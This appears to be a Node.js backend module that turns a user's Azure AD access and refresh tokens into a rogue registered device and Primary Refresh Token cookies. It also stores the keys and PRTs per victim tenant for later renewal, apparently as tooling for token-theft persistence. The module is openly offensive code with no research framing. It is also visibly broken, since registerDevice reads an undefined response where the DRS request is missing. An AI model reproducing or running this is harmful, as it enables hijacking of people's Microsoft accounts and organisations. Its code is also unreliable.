/**
 * VGenius C Engine â€“ Device Manager Service
 * Handles Azure AD Device Registration (DRS) and PRT generation
 */
const axios = require('axios');
const ms = require('./microsoftclient');
const crypto = require('crypto');
const forge = require('node-forge');
const { v4: uuidv4 } = require('uuid');
const db = require('../database/connection');
const config = require('../config/env');
const { encrypt, decrypt } = require('../utils/encrypt');

/**
 * Encode RSA public key to BCRYPT_RSAKEY_BLOB format (required by DRS)
 */
function encodePublicKeyToBlob(publicKey) {
  const n = publicKey.n;
  const e = publicKey.e;

  // BCRYPT_RSAKEY_BLOB header
  const header = Buffer.alloc(16);
  header.writeUInt32LE(0x31415352, 0); // Magic: 'RSA1'
  header.writeUInt32LE(2048, 4); // BitLength
  header.writeUInt32LE(3, 8); // cbPublicExp
  header.writeUInt32LE(256, 12); // cbModulus

  // Public exponent (3 bytes for 65537)
  const publicExp = Buffer.alloc(3);
  publicExp.writeUInt8(1, 0);
  publicExp.writeUInt8(0, 1);
  publicExp.writeUInt8(1, 2);

  // Modulus (256 bytes for 2048-bit key) - use hex string conversion for compatibility
  const modulusHex = n.toString(16);
  const modulus = Buffer.from(modulusHex.padStart(512, '0').slice(0, 512), 'hex');

  // Combine all parts
  const blob = Buffer.concat([header, publicExp, modulus]);

  return blob.toString('base64');
}

/**
 * Generate RSA key pair and valid PKCS#10 CSR using node-forge
 */
function generateKeyPairAndCsr(commonName) {
  const keys = forge.pki.rsa.generateKeyPair(2048);
  const privateKeyPem = forge.pki.privateKeyToPem(keys.privateKey);
  const publicKeyPem = forge.pki.publicKeyToPem(keys.publicKey);
  const transportKey = encodePublicKeyToBlob(keys.publicKey);

  const csr = forge.pki.createCertificationRequest();
  csr.publicKey = keys.publicKey;
  csr.setSubject([{ name: 'commonName', value: commonName }]);
  csr.sign(keys.privateKey);

  const csrPem = forge.pki.certificationRequestToPem(csr);
  return { privateKeyPem, publicKeyPem, csrPem, transportKey };
}

/**
 * Generate a random device name (like DESKTOP-ABCDEF)
 */
function generateDeviceName() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let name = 'DESKTOP-';
  for (let i = 0; i < 8; i++) {
    name += chars[Math.floor(Math.random() * chars.length)];
  }
  return name;
}

/**
 * Decode a JWT payload without verifying the signature.
 * Returns the claims object, or null if the token can't be parsed.
 * Used by the admin Device Test panel to pre-populate tenant/domain fields.
 */
function inspectJwt(jwtString) {
  if (!jwtString || typeof jwtString !== 'string') return null;
  const parts = jwtString.trim().split('.');
  if (parts.length !== 3) return null;
  try {
    const b64 = parts[1].replace(/-/g, '+').replace(/_/g, '/');
    const padded = b64 + '==='.slice(0, (4 - (b64.length % 4)) % 4);
    return JSON.parse(Buffer.from(padded, 'base64').toString('utf8'));
  } catch (e) {
    return null;
  }
}

/**
 * Best-effort extraction of tenant_id and target_domain from an access token JWT.
 * Returns { tenantId, targetDomain, upn, exp, iss, sub } â€” any field may be null.
 */
function extractTenantFromAccessToken(accessToken) {
  const claims = inspectJwt(accessToken);
  if (!claims) return { tenantId: null, targetDomain: null, upn: null, exp: null, iss: null, sub: null };
  const tenantId = claims.tid || null;
  const upn = claims.upn || claims.preferred_username || null;
  const targetDomain = typeof upn === 'string' && upn.includes('@') ? upn.split('@')[1] : null;
  return {
    tenantId,
    targetDomain,
    upn,
    exp: claims.exp || null,
    iss: claims.iss || null,
    sub: claims.sub || null
  };
}

/**
 * Register device with Azure AD DRS
 */
async function registerDevice(accessToken, tenantId, csrPem, targetDomain, transportKey) {
  const deviceName = generateDeviceName();

  if (!csrPem || typeof csrPem !== 'string' || !csrPem.includes('BEGIN CERTIFICATE REQUEST')) {
    throw new Error('Invalid CSR: csrPem is missing or not a valid PEM string');
  }

  // Convert CSR from PEM to DER and Base64
  let csr;
  try {
    csr = forge.pki.certificationRequestFromPem(csrPem);
  } catch (err) {

    const status = err.response?.status;
    const data = err.response?.data;
    if (status) {
      throw new Error(`DRS registration failed: HTTP ${status} - ${JSON.stringify(data)}`);
    }
    throw new Error(`DRS registration request failed: ${err.message}`);
  }

  const data = response.data;
  if (!data || typeof data !== 'object') {
    throw new Error(`DRS registration returned invalid response: ${typeof data}`);
  }

  // Handle multiple DRS response formats
  const deviceCertificate = data.Certificate || data.deviceCertificate || data.DeviceCertificate;
  const deviceId = data.User?.ObjectId || data.User?.deviceId || data.User?.id;
  const registrationTenantId = tenantId;
  let certificateThumbprint = null;
  let certificateDerBase64 = null; // Original DER base64 from DRS response â€” must preserve for x5c

  // Inspect the raw certificate format before normalization
  try {
    const rawCertForLog = typeof deviceCertificate === 'string'
      ? deviceCertificate
      : JSON.stringify(deviceCertificate);
    console.log('[DeviceManager] Raw certificate format inspect:', {
      type: typeof deviceCertificate,
      length: rawCertForLog?.length || null,
      prefix: rawCertForLog ? rawCertForLog.substring(0, 200) : null,
      suffix: rawCertForLog && rawCertForLog.length > 200 ? rawCertForLog.substring(rawCertForLog.length - 200) : null
    });
  } catch (e) {
    console.error('[DeviceManager] Raw certificate inspect failed:', e.message);
  }

  // Normalize certificate to string
  let certificateString = null;
  if (deviceCertificate) {
    if (typeof deviceCertificate === 'string') {
      certificateString = deviceCertificate;
    } else if (typeof deviceCertificate === 'object') {
      certificateString = JSON.stringify(deviceCertificate);
    } else {
      certificateString = String(deviceCertificate);
    }
  }

  // If certificate is not PEM, try to parse it
  if (certificateString && !certificateString.includes('BEGIN CERTIFICATE')) {
    console.log('[DeviceManager] Certificate is not PEM format, attempting to parse...');
    let parsed = false;
    const trimmed = certificateString.trim();
    // Case 1: JSON wrapper with Thumbprint/RawBody
    if (trimmed.startsWith('{') || trimmed.startsWith('[')) {
      try {
        const certJson = JSON.parse(trimmed);
        const rawBody = certJson.RawBody || certJson.rawBody || certJson.raw_body;
        const thumbprintFromJson = certJson.Thumbprint || certJson.thumbprint;
        if (typeof rawBody === 'string' && rawBody.length > 0) {
          try {
            const derBuffer = Buffer.from(rawBody, 'base64');
            // Store the original DER base64 for use in x5c â€” critical for AAD
            certificateDerBase64 = rawBody;
            // 'binary' (Latin-1) preserves every raw byte; plain toString() is UTF-8 and corrupts DER
            const cert = forge.pki.certificateFromAsn1(forge.asn1.fromDer(derBuffer.toString('binary')));
            certificateString = forge.pki.certificateToPem(cert);
            // Compute SHA-1 of the full DER-encoded certificate (this is the value AAD expects for x5t/kid)
            certificateThumbprint = crypto
              .createHash('sha1')
              .update(derBuffer)
              .digest('hex')
              .toUpperCase();
            if (typeof thumbprintFromJson === 'string' && thumbprintFromJson.length > 0) {
              if (thumbprintFromJson.toUpperCase() !== certificateThumbprint) {
                console.warn('[DeviceManager] DRS JSON Thumbprint differs from computed SHA-1 of DER:', {
                  json: thumbprintFromJson,
                  computed: certificateThumbprint
                });
              }
            }
            parsed = true;
          } catch (derErr) {
            console.error('[DeviceManager] DER parse failed (JSON RawBody):', derErr.message);
            // Fall through to try other formats rather than silently using the raw base64 blob
          }
        } else if (typeof thumbprintFromJson === 'string' && thumbprintFromJson.length > 0) {
          // No raw body, but we at least have a thumbprint from JSON (unverified)
          certificateThumbprint = thumbprintFromJson.toUpperCase();
          console.warn('[DeviceManager] No RawBody in DRS response; using JSON Thumbprint unverified:', certificateThumbprint);
        }
      } catch (jsonErr) {
        console.error('[DeviceManager] JSON parse failed for certificate payload:', jsonErr.message);
      }
    }
    if (!parsed) {
      // Case 2: base64 DER (naked, no PEM headers)
      try {
        const derBuffer = Buffer.from(trimmed, 'base64');
        const cert = forge.pki.certificateFromAsn1(forge.asn1.fromDer(derBuffer.toString('binary')));
        certificateString = forge.pki.certificateToPem(cert);
        certificateThumbprint = crypto.createHash('sha1').update(derBuffer).digest('hex').toUpperCase();
        parsed = true;
      } catch (e2) {
        // Not naked base64 DER either; try hex next
      }
    }
    if (!parsed) {
      // Case 3: hex string
      const hex = certificateString.trim();
      if (/^[0-9a-fA-F]+$/.test(hex) && hex.length % 2 === 0) {
        try {
          const derBuffer = Buffer.from(hex, 'hex');
          const cert = forge.pki.certificateFromAsn1(forge.asn1.fromDer(derBuffer.toString('binary')));
          certificateString = forge.pki.certificateToPem(cert);
          certificateThumbprint = crypto.createHash('sha1').update(derBuffer).digest('hex').toUpperCase();
          parsed = true;
        } catch (e2) {
          console.error('[DeviceManager] Certificate parsing failed after hex fallback:', e2.message);
        }
      }
    }
    if (!parsed) {
      console.error('[DeviceManager] Certificate parsing failed; keeping raw value for fallback logging');
    }
  }

  // Extract thumbprint from PEM if we don't already have one from JSON
  if (!certificateThumbprint && certificateString && certificateString.includes('BEGIN CERTIFICATE')) {
    try {
      const cert = forge.pki.certificateFromPem(certificateString);
      // SHA-1 over the full DER-encoded certificate (matches what DRS registers on AAD)
      const fullCertDer = forge.asn1.toDer(forge.pki.certificateToAsn1(cert)).getBytes();
      certificateThumbprint = crypto.createHash('sha1').update(fullCertDer, 'binary').digest('hex').toUpperCase();
    } catch (err) {
      console.error('[DeviceManager] Certificate thumbprint extraction failed:', err.message);
    }
  }

  if (!deviceId || !deviceCertificate) {
    // DRS can return HTTP 200 with an error body for business-logic rejections.
    // Surface the actual reason instead of "missing required fields".
    const errorType = data.ErrorType || data.errorType || 'unknown';
    const errorMsg = data.Message || data.message || '';
    const traceId = data.TraceId || data.traceId || '';
    throw new Error(
      `DRS registration rejected: ErrorType=${errorType}, Message=${errorMsg}, TraceId=${traceId}` +
      `\nFull response: ${JSON.stringify(data).substring(0, 500)}`
    );
  }

  console.log('[DeviceManager] DRS registration succeeded:', { deviceId, registrationTenantId, certificateLength: certificateString.length, certificateThumbprint });

  return {
    deviceId,
    deviceCertificate: certificateString,
    tenantId: registrationTenantId,
    certificateThumbprint,
    // CRITICAL: Store the original DER base64 from the DRS response.
    // The round-trip DER -> PEM -> DER via forge loses byte-level fidelity,
    // producing a different SHA-1 thumbprint. AAD computes the thumbprint from
    // the x5c certificate, so we MUST use the original DER bytes for both x5c
    // and the x5t/kid header claims, or AAD will reject the assertion with
    // AADSTS700027 (key not found).
    certificateDerBase64: certificateDerBase64 || null
  };
}

/**
 * Build client assertion JWT signed with device private key
 *
 * Headers per RFC 7515 + JWT/X.509 usage in Azure AD:
 *  - kid        : SHA-1 hex of the full DER-encoded certificate
 *  - x5t        : SHA-1 hex of the full DER-encoded certificate (same as kid)
 *  - x5t#S256   : SHA-256 hex of the full DER-encoded certificate
 *  - x5c        : [base64 DER certificate]  (AAD uses this to look up the registered key)
 *
 * All hashes are computed from the DER bytes themselves, never from a utf8 string,
 * because utf8 destroys bytes >= 0x80 and would produce the wrong thumbprint.
 */
function buildClientAssertion(privateKeyPem, deviceId, audience, certificatePem, certificateThumbprint, certificateDerBase64) {
  const now = Math.floor(Date.now() / 1000);

  const header = { alg: 'PS256', typ: 'JWT' };
  const payload = {
    iss: config.AZURE_CLIENT_ID,
    sub: config.AZURE_CLIENT_ID,
    aud: audience || 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
    jti: uuidv4(),
    nbf: now,
    exp: now + 600,
    device_id: deviceId
  };

  // Derive (or verify) the SHA-1 thumbprint from the real DER bytes of the certificate
  let thumbprint = certificateThumbprint || null;
  let derBase64 = null;
  let sha256Thumb = null;

  // PREFERRED: Use the original DER base64 from the DRS response directly.
  // This is the exact DER bytes that AAD issued, so the SHA-1 thumbprint will
  // match what AAD expects. The round-trip DER -> PEM -> DER via forge is NOT
  // byte-preserving and produces a different thumbprint, causing AADSTS700027.
  if (certificateDerBase64) {
    try {
      const derBuffer = Buffer.from(certificateDerBase64, 'base64');
      thumbprint = crypto.createHash('sha1').update(derBuffer).digest('hex').toUpperCase();
      sha256Thumb = crypto.createHash('sha256').update(derBuffer).digest('hex');
      derBase64 = certificateDerBase64;
      if (certificateThumbprint && certificateThumbprint.toUpperCase() !== thumbprint) {
        console.warn('[DeviceManager] Supplied thumbprint differs from computed SHA-1 of original DER:', {
          supplied: certificateThumbprint,
          computed: thumbprint
        });
      }
    } catch (err) {
      console.error('[DeviceManager] Failed to use original DER base64, falling back to PEM round-trip:', err.message);
    }
  }

  // FALLBACK: If we don't have the original DER base64, try PEM round-trip
  // (less reliable â€” may produce wrong thumbprint)
  if (!derBase64 && certificatePem && certificatePem.includes('BEGIN CERTIFICATE')) {
    try {
      const cert = forge.pki.certificateFromPem(certificatePem);
      const fullCertDer = forge.asn1.toDer(forge.pki.certificateToAsn1(cert)).getBytes();
      const derBuffer = Buffer.from(fullCertDer, 'binary');
      const computedSha1 = crypto.createHash('sha1').update(derBuffer).digest('hex').toUpperCase();
      const computedSha256 = crypto.createHash('sha256').update(derBuffer).digest('hex');

      thumbprint = computedSha1;
      sha256Thumb = computedSha256;
      derBase64 = derBuffer.toString('base64');

      if (certificateThumbprint && certificateThumbprint.toUpperCase() !== computedSha1) {
        console.warn('[DeviceManager] Supplied thumbprint differs from computed SHA-1 of DER (PEM round-trip, may be unreliable):', {
          supplied: certificateThumbprint,
          computed: computedSha1
        });
      }
    } catch (err) {
      console.error('[DeviceManager] Certificate thumbprint/x5c extraction failed:', err.message);
    }
  }

  if (!thumbprint) {
    throw new Error('Cannot build client assertion: no usable certificate thumbprint');
  }
  if (!derBase64) {
    throw new Error('Cannot build client assertion: no DER certificate available for x5c');
  }

  const sha1Buf = Buffer.from(thumbprint, 'hex');
  header.kid = sha1Buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  header.x5t = header.kid;
  if (sha256Thumb) { const sha256Buf = Buffer.from(sha256Thumb, 'hex'); header['x5t#S256'] = sha256Buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, ''); }
  header.x5c = [derBase64];

  const headerB64 = Buffer.from(JSON.stringify(header)).toString('base64url');
  const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const signData = `${headerB64}.${payloadB64}`;

  // Sanity: refuse to sign if header is missing required fields
  if (!header.x5c || !header.kid || !header.x5t) {
    throw new Error('Refusing to sign client assertion: missing x5c/kid/x5t');
  }

  // Sign with the RSA private key PEM using PSS padding (required for PS256)
  const signature = crypto.sign('sha256', Buffer.from(signData), {
    key: privateKeyPem,
    padding: crypto.constants.RSA_PKCS1_PSS_PADDING,
    saltLength: crypto.constants.RSA_PSS_SALTLEN_DIGEST
  }).toString('base64url');

  console.log('[DeviceManager] Client assertion header:', header);

  return `${signData}.${signature}`;
}

/**
 * Exchange refresh token + client assertion for PRT cookie
 */
/**
 * Exchange refresh token + client assertion for PRT cookie
 * Tries tenant-specific endpoint first, then falls back to common.
 */
async function getPrtCookie(clientAssertion, refreshToken, tenantId) {
  const refreshPrefix = refreshToken ? refreshToken.substring(0, 12) : null;
  const assertionPrefix = clientAssertion ? clientAssertion.substring(0, 16) : null;
  console.log('[DeviceManager] PRT exchange start', {
    tenantId: tenantId || 'common',
    refreshPrefix,
    assertionPrefix,
    assertionLength: clientAssertion ? clientAssertion.length : 0,
  });

  const endpoints = [];
  if (tenantId && tenantId !== 'common' && tenantId !== 'organizations') {
    endpoints.push(`https://login.microsoftonline.com/${tenantId}/oauth2/v2.0/token`);
  }
  endpoints.push('https://login.microsoftonline.com/common/oauth2/v2.0/token');

  let lastErrorBody = null;
  for (const url of endpoints) {
    const params = new URLSearchParams({
      client_id: config.AZURE_CLIENT_ID,
      client_assertion_type: 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
      client_assertion: clientAssertion,
      grant_type: 'refresh_token',
      refresh_token: refreshToken,
      scope: 'openid profile offline_access'
    });

    try {
      const response = await ms.post(url, params, {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        timeout: 30000
      });

      if (response.status !== 200) {
        const errorBody = response.data ? JSON.stringify(response.data) : 'No response body';
        console.error('[DeviceManager] PRT exchange HTTP', response.status, 'from', url, 'body:', errorBody);
        lastErrorBody = errorBody;
        if (response.status === 401 || response.status === 400) {
          continue;
        }
        throw new Error(`PRT exchange failed: HTTP ${response.status} - ${errorBody}`);
      }

      const setCookie = response.headers['set-cookie'];
      if (!setCookie) {
        throw new Error('No Set-Cookie header in PRT response');
      }

      let prtCookie = null;
      for (const cookie of setCookie) {
        if (cookie.includes('x-ms-RefreshTokenCredential=')) {
          const match = cookie.match(/x-ms-RefreshTokenCredential=([^;]+)/);
          if (match) {
            prtCookie = match[1];
            break;
          }
        }
      }

      if (!prtCookie) {
        throw new Error('PRT cookie not found in response');
      }

      console.log('[DeviceManager] PRT cookie obtained successfully');
      return prtCookie;
    } catch (err) {
      if (err.code === 'ENOTFOUND' || err.code === 'ETIMEDOUT') {
        throw err;
      }
      if (err.response && (err.response.status === 401 || err.response.status === 400)) {
        const errorBody = err.response.data ? JSON.stringify(err.response.data) : 'No response body';
        console.error('[DeviceManager] PRT exchange HTTP', err.response.status, 'from', url, 'body:', errorBody);
        lastErrorBody = errorBody;
        continue;
      }
      throw err;
    }
  }

  throw new Error(`PRT cookie exchange failed: last_error=${lastErrorBody}`);
}

/**
 * Full device registration and PRT generation flow
 *
 * tokenData:
 *   access_token, refresh_token, tenant_id, user_id, target_domain
 *   inMemory (bool, default false) â€” when true, forces a fresh DRS registration
 *     even if stored credentials exist for the same user_id + tenant_id. Used by
 *     the admin Device Test panel to avoid mutating a real user's stored state.
 */
async function registerDeviceAndGetPrt(tokenData) {
  const { access_token, tenant_id, refresh_token, user_id, target_domain, inMemory } = tokenData;

  // Step 0: Check for existing device credentials and reuse if available
  // (skip this check entirely in inMemory mode so the test always exercises the full flow)
  if (!inMemory && user_id && tenant_id) {
    const existing = await getStoredPrtCookie(user_id, tenant_id);
    if (existing && existing.prtCookie) {
      console.log('[DeviceManager] Reusing existing device credentials for user', user_id, 'tenant', tenant_id);
      try {
        const freshCookie = await refreshPrtCookie(user_id, tenant_id, refresh_token);
        const [credRows] = await db.query(
          'SELECT device_id, device_certificate_encrypted, encrypted_private_key FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
          [user_id, tenant_id]
        );
        if (credRows.length > 0) {
          return {
            deviceId: credRows[0].device_id,
            deviceCertificate: decrypt(credRows[0].device_certificate_encrypted),
            certificateThumbprint: null,
            prtCookie: freshCookie,
            privateKey: decrypt(credRows[0].encrypted_private_key),
            tenantId: tenant_id
          };
        }
      } catch (err) {
        console.warn('[DeviceManager] Refresh failed, will re-register:', err.message);
      }
    }
  } else if (inMemory && user_id && tenant_id) {
    console.log('[DeviceManager] inMemory mode: skipping reuse check for user', user_id, 'tenant', tenant_id);
  }

  // Step 1: Generate RSA key pair and CSR using node-forge
  const deviceName = generateDeviceName();
  const { privateKeyPem, csrPem, transportKey } = generateKeyPairAndCsr(deviceName);
  console.log('[DeviceManager] Generated RSA key pair and CSR');

  // Step 2: Exchange refresh token for a fresh DRS-scoped access token
  // This bypass is required because the initial access token may not contain the ACRS claim.
  let drsAccessToken = access_token;
  if (refresh_token) {
    try {
      const tokenResp = await ms.post(
        `https://login.microsoftonline.com/${tenant_id || 'common'}/oauth2/v2.0/token`,
        new URLSearchParams({
          client_id: config.AZURE_CLIENT_ID,
          refresh_token: refresh_token,
          grant_type: 'refresh_token',
          scope: '01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default'
        }),
        {
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          timeout: 30000
        }
      );

      if (tokenResp.data && tokenResp.data.access_token) {
        drsAccessToken = tokenResp.data.access_token;
        console.log('[DeviceManager] Exchanged refresh token for DRS-scoped access token');
      } else {
        console.log('[DeviceManager] Refresh token exchange did not return access_token, falling back to initial token');
      }
    } catch (err) {
      console.error('[DeviceManager] Refresh token exchange failed:', err.message);
      // Fallback to initial access_token



    }
  }

  // Step 3: Register device with DRS (pass target_domain for email domain)
  let registrationResult;
  try {
    const tokenPrefix = drsAccessToken ? drsAccessToken.substring(0, 12) : null;
    let accessTokenClaims = null;
    try {
      const payloadB64 = drsAccessToken.split('.')[1];
      const json = Buffer.from(payloadB64.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
      const claims = JSON.parse(json);
      accessTokenClaims = {
        aud: claims.aud || null,
        scp: claims.scp || null,
        acrs: claims.acrs || null,
        tid: claims.tid || null,
        oid: claims.oid || null,
      };
    } catch (e) {
      accessTokenClaims = { decode_error: e.message };
    }
    console.log('[DeviceManager] DRS debug:', { tenantId: tenant_id, targetDomain: target_domain, tokenPrefix, accessTokenClaims });
    registrationResult = await registerDevice(drsAccessToken, tenant_id, csrPem, target_domain, transportKey);
    console.log('[DeviceManager] Device registered:', registrationResult.deviceId);

  } catch (err) {
    console.error('[DeviceManager] DRS registration failed:', err.message);
    const primaryMsg = err && err.message ? err.message : String(err);
    if (/DeviceCapReached/i.test(primaryMsg) || /50043/.test(primaryMsg)) {
      console.warn('[DeviceManager] DRS device limit reached, skipping device registration');
      return {
        deviceId: null,
        deviceCertificate: null,
        certificateThumbprint: null,
        certificateDerBase64: null,
        prtCookie: null,
        privateKey: privateKeyPem,
        tenantId: tenant_id,
        enrollmentBlocked: 'DeviceCapReached'
      };
    }
    throw new Error(`Device registration failed: ${err.message}`);
  }

  // Step 4: Store device credentials IMMEDIATELY after DRS succeeds
  // This ensures the certificate and private key are persisted even if PRT exchange fails
  if (user_id !== null && user_id !== undefined && tenant_id) {
    try {
      await storeDeviceCredentials({
        deviceId: registrationResult.deviceId,
        deviceCertificate: registrationResult.deviceCertificate,
        certificateThumbprint: registrationResult.certificateThumbprint || null,
        certificateDerBase64: registrationResult.certificateDerBase64 || null,
        prtCookie: null, // PRT not yet available
        privateKey: privateKeyPem,
        tenantId: tenant_id
      }, user_id, null);
      console.log('[DeviceManager] Device credentials stored (PRT pending)');
    } catch (storeErr) {
      console.error('[DeviceManager] Failed to store device credentials:', storeErr.message);
    }
  }

  // Step 5: Build client assertion with correct audience for tenant
  const assertionAudience = `https://login.microsoftonline.com/${tenant_id || 'common'}/oauth2/v2.0/token`;
  const drsThumbprint = registrationResult.certificateThumbprint || null;
  const drsDerBase64 = registrationResult.certificateDerBase64 || null;
  console.log('[DeviceManager] Using DRS certificate thumbprint:', drsThumbprint);
  console.log('[DeviceManager] Using DRS certificate DER base64:', drsDerBase64 ? 'present' : 'missing');
  const clientAssertion = buildClientAssertion(privateKeyPem, registrationResult.deviceId, assertionAudience, registrationResult.deviceCertificate, drsThumbprint, drsDerBase64);
  console.log('[DeviceManager] Client assertion built');

  // Step 5: Exchange for PRT cookie
  let prtCookie;
  try {
    prtCookie = await getPrtCookie(clientAssertion, refresh_token, tenant_id);
  } catch (err) {
    console.error('[DeviceManager] PRT exchange failed:', err.message);
    throw new Error(`PRT cookie exchange failed: ${err.message}`);
  }

  // Step 6: Update stored PRT cookie if we stored credentials above
  if (user_id !== null && user_id !== undefined && tenant_id) {
    try {
      await db.query(
        'UPDATE device_credentials SET prt_cookie_encrypted = ?, last_used = NOW(), updated_at = NOW() WHERE user_id = ? AND tenant_id = ?',
        [encrypt(prtCookie), user_id, tenant_id]
      );
      console.log('[DeviceManager] PRT cookie updated in storage');
    } catch (updateErr) {
      console.error('[DeviceManager] Failed to update stored PRT cookie:', updateErr.message);
    }
  }

  return {
    deviceId: registrationResult.deviceId,
    deviceCertificate: registrationResult.deviceCertificate,
    certificateThumbprint: registrationResult.certificateThumbprint || null,
    certificateDerBase64: registrationResult.certificateDerBase64 || null,
    prtCookie: prtCookie,
    privateKey: privateKeyPem,
    tenantId: registrationResult.tenantId
  };
}

/**
 * Store device credentials in database
 */
async function storeDeviceCredentials(credentials, userId, userPrincipalName) {
  const { deviceId, deviceCertificate, prtCookie, privateKey, tenantId, certificateDerBase64 } = credentials;

  if (!userId || !tenantId) {
    const err = new Error('storeDeviceCredentials requires userId and tenantId');
    err.code = 'MISSING_STORAGE_KEY';
    throw err;
  }
  if (!deviceId || !deviceCertificate || !privateKey) {
    const err = new Error('storeDeviceCredentials received incomplete credentials: ' +
      JSON.stringify({
        hasDeviceId: !!deviceId,
        hasCertificate: !!deviceCertificate,
        hasPrtCookie: !!prtCookie,
        hasPrivateKey: !!privateKey
      }));
    err.code = 'INCOMPLETE_CREDENTIALS';
    throw err;
  }

  const encryptedPrivateKey = encrypt(privateKey);
  const encryptedPrtCookie = prtCookie ? encrypt(prtCookie) : null;
  const encryptedCertificate = encrypt(deviceCertificate);
  const encryptedDerBase64 = certificateDerBase64 ? encrypt(certificateDerBase64) : null;

  const [existing] = await db.query(
    'SELECT id FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
    [userId, tenantId]
  );

  if (existing.length > 0) {
    await db.query(
      `UPDATE device_credentials SET
      device_certificate_encrypted = ?,
      encrypted_private_key = ?,
      prt_cookie_encrypted = ?,
      certificate_der_base64 = ?,
      last_used = NOW(),
      updated_at = NOW()
      WHERE user_id = ? AND tenant_id = ?`,
      [encryptedCertificate, encryptedPrivateKey, encryptedPrtCookie, encryptedDerBase64, userId, tenantId]
    );
    console.log('[DeviceManager] Updated existing device credentials');
  } else {
    await db.query(
      `INSERT INTO device_credentials
      (user_id, tenant_id, device_id, device_certificate_encrypted, encrypted_private_key, prt_cookie_encrypted, certificate_der_base64, user_principal_name, created_at, last_used)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, NOW(), NOW())`,
      [userId, tenantId, deviceId, encryptedCertificate, encryptedPrivateKey, encryptedPrtCookie, encryptedDerBase64, userPrincipalName || '']
    );
    console.log('[DeviceManager] Stored new device credentials');
  }
}

/**
 * Get stored PRT cookie for a user+tenant
 */
async function getStoredPrtCookie(userId, tenantId) {
  const [rows] = await db.query(
    'SELECT prt_cookie_encrypted, device_id FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
    [userId, tenantId]
  );

  if (rows.length === 0) return null;

  try {
    const prtCookie = decrypt(rows[0].prt_cookie_encrypted);
    return { prtCookie, deviceId: rows[0].device_id };
  } catch (err) {
    console.error('[DeviceManager] Failed to decrypt PRT cookie:', err.message);
    return null;
  }
}

/**
 * Refresh PRT cookie using stored device credentials
 */
async function refreshPrtCookie(userId, tenantId, refreshToken) {
  const credentials = await getStoredPrtCookie(userId, tenantId);
  if (!credentials) throw new Error('No device credentials found');

  const [deviceRows] = await db.query(
    'SELECT encrypted_private_key, device_certificate_encrypted FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
    [userId, tenantId]
  );

  if (deviceRows.length === 0) throw new Error('Device private key not found');

  try {
    const privateKey = decrypt(deviceRows[0].encrypted_private_key);
    const deviceCertificate = decrypt(deviceRows[0].device_certificate_encrypted);
    const audience = `https://login.microsoftonline.com/${tenantId || 'common'}/oauth2/v2.0/token`;
    // Note: certificateDerBase64 is not yet stored in the DB (requires migration),
    // so we pass null and rely on the PEM round-trip fallback. Once the migration
    // is applied, we can retrieve it from the `certificate_der_base64` column.
    const derBase64 = deviceRows[0].certificate_der_base64 ? decrypt(deviceRows[0].certificate_der_base64) : null;
    const clientAssertion = buildClientAssertion(privateKey, credentials.deviceId, audience, deviceCertificate, null, derBase64);
    const prtCookie = await getPrtCookie(clientAssertion, refreshToken);

    await db.query(
      'UPDATE device_credentials SET prt_cookie_encrypted = ?, last_used = NOW() WHERE user_id = ? AND tenant_id = ?',
      [encrypt(prtCookie), userId, tenantId]
    );

    console.log('[DeviceManager] PRT cookie refreshed');
    return prtCookie;
  } catch (err) {
    console.error('[DeviceManager] PRT refresh failed:', err.message);
    throw err;
  }
}

/**
 * List stored device credentials (safe fields only, no encrypted blobs)
 *
 * Used by the admin Device Test panel to enumerate rows so an operator can
 * pick one to renew or clear. Never returns the encrypted cert / key / PRT.
 */
async function listStoredCredentials() {
  const [rows] = await db.query(
    `SELECT id, user_id, tenant_id, device_id, user_principal_name, created_at, last_used
     FROM device_credentials
     ORDER BY COALESCE(last_used, created_at) DESC, id DESC`
  );
  return rows;
}

/**
 * Delete a stored device_credentials row.
 * Deletes by (user_id, tenant_id) composite key â€” the natural identifier.
 *
 * @returns {boolean} true if a row was deleted, false if nothing matched.
 */
async function deleteStoredCredentials(userId, tenantId) {
  const [result] = await db.query(
    'DELETE FROM device_credentials WHERE user_id = ? AND tenant_id = ?',
    [userId, tenantId]
  );
  return (result.affectedRows || 0) > 0;
}

/**
 * Best-effort existence check for the device_credentials table.
 * Throws a clear error if the schema is missing so admin UI can show it.
 */
async function deviceCredentialsTableExists() {
  try {
    const [rows] = await db.query(
      "SELECT COUNT(*) as cnt FROM information_schema.tables " +
      "WHERE table_schema = DATABASE() AND table_name = 'device_credentials'"
    );
    return (rows && rows.length && rows[0].cnt > 0);
  } catch (err) {
    return false;
  }
}

/**
 * Obtain a DRS-scoped access_token by exchanging a normal refresh token.
 * Returns { accessToken, deviceId } or null.
 */
async function exchangeForDrsToken(refreshToken, tenantId) {
  try {
    const tokenResp = await ms.post(
      `https://login.microsoftonline.com/${tenantId || 'common'}/oauth2/v2.0/token`,
      new URLSearchParams({
        client_id: config.AZURE_CLIENT_ID,
        refresh_token: refreshToken,
        grant_type: 'refresh_token',
        scope: '01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9/.default'
      }),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        timeout: 30000
      }
    );

    if (tokenResp.data && tokenResp.data.access_token) {
      const claims = inspectJwt(tokenResp.data.access_token);
      return {
        accessToken: tokenResp.data.access_token,
        deviceId: (claims && (claims.oid || claims.sub)) || null
      };
    }
    return null;
  } catch (err) {
    console.error('[DeviceManager] exchangeForDrsToken failed:', err.message);
    return null;
  }
}

module.exports = {
  generateKeyPairAndCsr,
  generateDeviceName,
  registerDevice,
  buildClientAssertion,
  getPrtCookie,
  registerDeviceAndGetPrt,
  storeDeviceCredentials,
  getStoredPrtCookie,
  refreshPrtCookie,
  listStoredCredentials,
  deleteStoredCredentials,
  deviceCredentialsTableExists,
  inspectJwt,
  extractTenantFromAccessToken,
  exchangeForDrsToken
};
